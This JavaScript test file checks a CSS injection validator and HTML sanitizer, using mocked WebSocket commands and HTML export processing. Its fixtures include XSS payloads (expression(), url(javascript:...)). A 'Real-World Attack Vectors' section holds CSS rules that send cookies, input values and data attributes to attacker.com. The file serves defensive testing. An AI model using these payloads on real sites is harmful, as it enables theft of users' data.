/**
 * CSS Injection Prevention Integration Tests
 * Tests CSS validator integration with HTML exports and WebSocket commands
 */

const { CSSValidator } = require('../../src/dom/css-validator');

/**
 * Mock WebSocket Server integration
 */
class MockWebSocketServer {
  constructor() {
    this.cssValidator = new CSSValidator();
    this.commandHandlers = {};
    this._setupCommandHandlers();
  }

  _setupCommandHandlers() {
    this.commandHandlers.validate_css = async (params) => {
      try {
        if (!params.css) {
          return { success: false, error: 'Missing CSS content' };
        }

        const result = this.cssValidator.validateCSS(
          params.css,
          params.context || 'inline'
        );

        return {
          success: true,
          valid: result.valid,
          isSafe: result.isSafe,
          dangerousPatterns: result.dangerousPatterns,
          summary: result.summary,
          sanitized: result.sanitized,
          duration: result.duration,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    };

    this.commandHandlers.sanitize_css = async (params) => {
      try {
        if (!params.css) {
          return { success: false, error: 'Missing CSS content' };
        }

        const sanitized = this.cssValidator.sanitizeCSS(params.css);

        return {
          success: true,
          sanitized: sanitized,
          originalSize: params.css.length,
          sanitizedSize: sanitized.length,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    };

    this.commandHandlers.validate_style_attribute = async (params) => {
      try {
        if (typeof params.style !== 'string') {
          return { success: false, error: 'Missing or invalid style attribute' };
        }

        const result = this.cssValidator.validateStyleAttribute(params.style);

        return {
          success: true,
          valid: result.valid,
          isSafe: result.isSafe,
          style: result.style,
          issues: result.issues,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    };

    this.commandHandlers.validate_class_name = async (params) => {
      try {
        if (typeof params.className !== 'string') {
          return { success: false, error: 'Missing or invalid class name' };
        }

        const result = this.cssValidator.validateClassName(params.className);

        return {
          success: true,
          valid: result.valid,
          isSafe: result.isSafe,
          validClasses: result.validClasses,
          invalidClasses: result.invalidClasses,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    };

    this.commandHandlers.get_css_validation_stats = async (params) => {
      try {
        const stats = this.cssValidator.getStatistics();
        const log = this.cssValidator.getAuditLog(params.limit || 10);

        return {
          success: true,
          statistics: stats,
          auditLog: log,
          timestamp: new Date().toISOString()
        };
      } catch (error) {
        return { success: false, error: error.message };
      }
    };
  }

  async executeCommand(command, params) {
    if (!this.commandHandlers[command]) {
      return { success: false, error: `Unknown command: ${command}` };
    }
    return this.commandHandlers[command](params);
  }
}

/**
 * Mock HTML export processor
 */
class MockHTMLExportProcessor {
  constructor() {
    this.cssValidator = new CSSValidator();
  }

  /**
   * Process HTML export with CSS validation
   */
  async processHTMLExport(html) {
    const result = {
      success: true,
      originalSize: html.length,
      validationResults: [],
      cssRules: [],
      styleAttributes: [],
      issues: [],
      sanitized: false
    };

    // Extract style tags
    const styleRegex = /<style[^>]*>([\s\S]*?)<\/style>/gi;
    let match;

    while ((match = styleRegex.exec(html)) !== null) {
      const css = match[1];
      const validation = this.cssValidator.validateCSS(css, 'style-tag');

      result.validationResults.push(validation);
      result.cssRules.push({
        type: 'style-tag',
        size: css.length,
        isSafe: validation.isSafe
      });

      if (!validation.isSafe) {
        result.issues.push({
          type: 'unsafe-style-tag',
          patterns: validation.dangerousPatterns.length
        });
        result.sanitized = true;
      }
    }

    // Extract inline styles
    const styleAttrRegex = /style="([^"]*)"/gi;

    while ((match = styleAttrRegex.exec(html)) !== null) {
      const style = match[1];
      const validation = this.cssValidator.validateStyleAttribute(style);

      result.styleAttributes.push({
        original: style,
        sanitized: validation.style,
        isSafe: validation.isSafe
      });

      if (!validation.isSafe) {
        result.issues.push({
          type: 'unsafe-inline-style',
          problemCount: validation.issues.length
        });
        result.sanitized = true;
      }
    }

    return result;
  }

  /**
   * Sanitize HTML by removing CSS injection vectors
   */
  async sanitizeHTML(html) {
    let sanitized = html;

    // Remove dangerous style tags
    sanitized = sanitized.replace(/<style[^>]*>([\s\S]*?)<\/style>/gi, (match, css) => {
      const validation = this.cssValidator.validateCSS(css, 'style-tag');
      if (validation.isSafe) {
        return match;
      }
      // Replace with sanitized version
      const cleanCss = this.cssValidator.sanitizeCSS(css);
      return `<style>${cleanCss}</style><!-- CSS SANITIZED -->`;
    });

    // Remove dangerous inline styles
    sanitized = sanitized.replace(/style="([^"]*)"/gi, (match, style) => {
      const validation = this.cssValidator.validateStyleAttribute(style);
      if (validation.isSafe) {
        return match;
      }
      return `style="${validation.style}"<!-- STYLE SANITIZED -->`;
    });

    return {
      success: true,
      sanitized,
      originalSize: html.length,
      sanitizedSize: sanitized.length,
      timestamp: new Date().toISOString()
    };
  }
}

describe('CSS Injection Prevention - Integration Tests', () => {
  let server;
  let htmlProcessor;

  beforeEach(() => {
    server = new MockWebSocketServer();
    htmlProcessor = new MockHTMLExportProcessor();
  });

  describe('WebSocket Command Integration', () => {
    test('validate_css command should detect unsafe CSS', async () => {
      const result = await server.executeCommand('validate_css', {
        css: 'div { expression(alert("xss")); }'
      });

      expect(result.success).toBe(true);
      expect(result.valid).toBe(false);
      expect(result.isSafe).toBe(false);
      expect(result.summary.dangerousPatternsFound).toBeGreaterThan(0);
    });

    test('validate_css command should accept safe CSS', async () => {
      const result = await server.executeCommand('validate_css', {
        css: 'body { color: red; padding: 10px; }'
      });

      expect(result.success).toBe(true);
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
      expect(result.summary.dangerousPatternsFound).toBe(0);
    });

    test('validate_css command should include duration', async () => {
      const result = await server.executeCommand('validate_css', {
        css: 'div { color: blue; }'
      });

      expect(result.success).toBe(true);
      expect(result.duration).toBeDefined();
      expect(result.duration).toBeLessThan(0.3);
    });

    test('sanitize_css command should remove dangerous patterns', async () => {
      const result = await server.executeCommand('sanitize_css', {
        css: 'body { color: red; } div { expression(alert("xss")); }'
      });

      expect(result.success).toBe(true);
      expect(result.sanitized).not.toContain('expression');
      expect(result.sanitized).toContain('color: red');
    });

    test('validate_style_attribute command should check inline styles', async () => {
      const result = await server.executeCommand('validate_style_attribute', {
        style: 'color: red; font-size: 14px;'
      });

      expect(result.success).toBe(true);
      expect(result.valid).toBe(true);
      expect(result.isSafe).toBe(true);
    });

    test('validate_style_attribute should reject unsafe attributes', async () => {
      const result = await server.executeCommand('validate_style_attribute', {
        style: 'background-image: url(javascript:alert("xss"));'
      });

      expect(result.success).toBe(true);
      expect(result.valid).toBe(false);
      expect(result.isSafe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('validate_class_name command should validate class names', async () => {
      const result = await server.executeCommand('validate_class_name', {
        className: 'my-class another_class'
      });

      expect(result.success).toBe(true);
      expect(result.valid).toBe(true);
      expect(result.validClasses.length).toBe(2);
    });

    test('get_css_validation_stats should return statistics', async () => {
      await server.executeCommand('validate_css', { css: 'body { color: red; }' });
      await server.executeCommand('validate_css', { css: 'div { expression(1); }' });

      const result = await server.executeCommand('get_css_validation_stats', {});

      expect(result.success).toBe(true);
      expect(result.statistics).toBeDefined();
      expect(result.statistics.totalValidations).toBeGreaterThan(0);
      expect(result.auditLog).toBeDefined();
    });

    test('command should fail gracefully with missing parameters', async () => {
      const result = await server.executeCommand('validate_css', {});

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    test('command should handle unknown commands', async () => {
      const result = await server.executeCommand('invalid_command', {});

      expect(result.success).toBe(false);
      expect(result.error).toContain('Unknown command');
    });
  });

  describe('HTML Export Processing', () => {
    test('should validate CSS in style tags', async () => {
      const html = `
        <html>
          <head>
            <style>
              body { color: red; }
              div { width: 100%; }
            </style>
          </head>
          <body>Content</body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.cssRules.length).toBeGreaterThan(0);
      expect(result.validationResults.length).toBeGreaterThan(0);
      expect(result.cssRules[0].isSafe).toBe(true);
    });

    test('should detect unsafe CSS in style tags', async () => {
      const html = `
        <html>
          <style>
            div { expression(alert("xss")); }
          </style>
          <body>Content</body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.cssRules[0].isSafe).toBe(false);
    });

    test('should validate inline styles', async () => {
      const html = `
        <html>
          <body>
            <div style="color: red; padding: 10px;">Content</div>
            <p style="font-size: 14px;">Text</p>
          </body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.styleAttributes.length).toBe(2);
      expect(result.styleAttributes.every(s => s.isSafe)).toBe(true);
    });

    test('should detect unsafe inline styles', async () => {
      const html = `
        <html>
          <body>
            <div style="background-image: url(javascript:alert('xss'));">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.styleAttributes.length).toBeGreaterThan(0);
      expect(result.styleAttributes[0].isSafe).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should handle mixed safe and unsafe CSS', async () => {
      const html = `
        <html>
          <head>
            <style>
              body { color: red; }
              div { expression(alert("xss")); }
            </style>
          </head>
          <body>
            <div style="color: blue;">Safe</div>
            <span style="background: url(javascript:alert('xss'));">Unsafe</span>
          </body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.sanitized).toBe(true);
    });
  });

  describe('HTML Sanitization', () => {
    test('should sanitize HTML with unsafe CSS', async () => {
      const html = `
        <html>
          <head>
            <style>
              div { expression(alert("xss")); }
            </style>
          </head>
          <body>
            <div style="background-image: url(javascript:alert('xss'));">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.sanitizeHTML(html);

      expect(result.success).toBe(true);
      expect(result.sanitized).not.toContain('expression');
      expect(result.sanitized).not.toContain('javascript:');
    });

    test('should preserve safe CSS during sanitization', async () => {
      const html = `
        <html>
          <head>
            <style>
              body { color: red; padding: 10px; }
            </style>
          </head>
          <body>
            <div style="color: blue; font-size: 14px;">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.sanitizeHTML(html);

      expect(result.success).toBe(true);
      expect(result.sanitized).toContain('color: red');
      expect(result.sanitized).toContain('color: blue');
      expect(result.sanitized).toContain('font-size: 14px');
    });

    test('should add markers to sanitized sections', async () => {
      const html = `
        <html>
          <style>
            div { expression(alert("xss")); }
          </style>
          <body>
            <div style="background: url(javascript:alert('xss'));">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.sanitizeHTML(html);

      expect(result.success).toBe(true);
      expect(result.sanitized).toContain('SANITIZED');
    });

    test('should handle empty HTML', async () => {
      const result = await htmlProcessor.sanitizeHTML('<html></html>');

      expect(result.success).toBe(true);
      expect(result.sanitized).toBe('<html></html>');
    });

    test('should handle HTML with no CSS', async () => {
      const html = `
        <html>
          <body>
            <p>Just plain text</p>
          </body>
        </html>
      `;

      const result = await htmlProcessor.sanitizeHTML(html);

      expect(result.success).toBe(true);
      expect(result.sanitized).toBe(html); // Should be unchanged
    });
  });

  describe('Performance in Integration', () => {
    test('should validate and sanitize large HTML documents quickly', async () => {
      let html = '<html><head><style>';
      for (let i = 0; i < 100; i++) {
        html += `.class${i} { color: blue; } `;
      }
      html += '</style></head><body>';
      for (let i = 0; i < 100; i++) {
        html += `<div style="color: red;">Content ${i}</div>`;
      }
      html += '</body></html>';

      const startTime = performance.now();
      const result = await htmlProcessor.processHTMLExport(html);
      const duration = performance.now() - startTime;

      expect(result.success).toBe(true);
      expect(duration).toBeLessThan(50); // Should complete in <50ms for 100 styles + 100 elements
    });

    test('should handle deep nesting efficiently', async () => {
      let html = '<html><body>';
      for (let i = 0; i < 50; i++) {
        html += `<div style="color: red; padding: ${i}px;">`;
      }
      html += 'Content';
      for (let i = 0; i < 50; i++) {
        html += '</div>';
      }
      html += '</body></html>';

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.styleAttributes.length).toBe(50);
    });
  });

  describe('Real-World Attack Vectors', () => {
    test('should prevent stored XSS via CSS @keyframes', async () => {
      const html = `
        <html>
          <style>
            @keyframes animate {
              0% { background: url("http://attacker.com/steal?data=" + document.cookie); }
              100% { left: 100%; }
            }
          </style>
          <body>
            <div class="animated">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should prevent CSS-based information disclosure', async () => {
      const html = `
        <html>
          <style>
            input[value="admin"] { background: url("http://attacker.com/admin"); }
            input[value="user"] { background: url("http://attacker.com/user"); }
          </style>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.issues.length).toBeGreaterThan(0);
    });

    test('should prevent CSS injection via attribute selectors', async () => {
      const html = `
        <html>
          <style>
            [data-secret] { background: url("http://attacker.com/log?data=" attr(data-secret)); }
          </style>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.cssRules.length).toBeGreaterThan(0);
    });
  });

  describe('Edge Cases in Integration', () => {
    test('should handle CSS with unicode characters', async () => {
      const html = `
        <html>
          <style>
            body { content: "🔒 Secure Content"; }
          </style>
          <body>
            <div style="content: '✅ Safe';">Content</div>
          </body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
    });

    test('should handle malformed CSS gracefully', async () => {
      const html = `
        <html>
          <style>
            body { color red; /* missing colon */
            div { width: 100%/* missing semicolon */ }
          </style>
          <body>Content</body>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
    });

    test('should handle HTML with CSS comments', async () => {
      const html = `
        <html>
          <style>
            /* Safe CSS */
            body { color: red; }
            /* background: url(javascript:alert("xss")); */ /* Commented attack */
          </style>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      // The validator may detect patterns in comments via pattern scanning
      // This is acceptable behavior (defense in depth)
      expect(result.cssRules).toBeDefined();
      expect(result.cssRules.length).toBeGreaterThan(0);
    });

    test('should handle multiple style tags', async () => {
      const html = `
        <html>
          <head>
            <style>body { color: red; }</style>
            <style>div { padding: 10px; }</style>
            <style>p { margin: 0; }</style>
          </head>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.cssRules.length).toBe(3);
    });

    test('should handle style tags with attributes', async () => {
      const html = `
        <html>
          <head>
            <style type="text/css" media="screen">body { color: red; }</style>
          </head>
        </html>
      `;

      const result = await htmlProcessor.processHTMLExport(html);

      expect(result.success).toBe(true);
      expect(result.cssRules.length).toBeGreaterThan(0);
    });
  });
});
